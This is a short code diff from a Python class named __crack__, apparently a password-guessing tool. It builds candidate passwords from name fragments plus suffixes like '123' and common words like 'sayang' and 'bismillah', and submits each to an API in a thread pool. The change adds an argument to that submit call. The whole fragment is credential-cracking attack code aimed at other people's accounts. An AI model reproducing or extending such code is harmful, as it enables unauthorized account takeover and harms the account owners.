@@ -868,7 +868,7 @@ class __crack__:
                         		xz[3], xz[3]+'123', xz[3]+'12345',
 					'sayang', 'bismillah',
                         	]
-                        __yayanXD__.submit(self.__api__, bb[0])
+                        __yayanXD__.submit(self.__api__, bb[0], raimuuu)
                     except:
                         pass
 
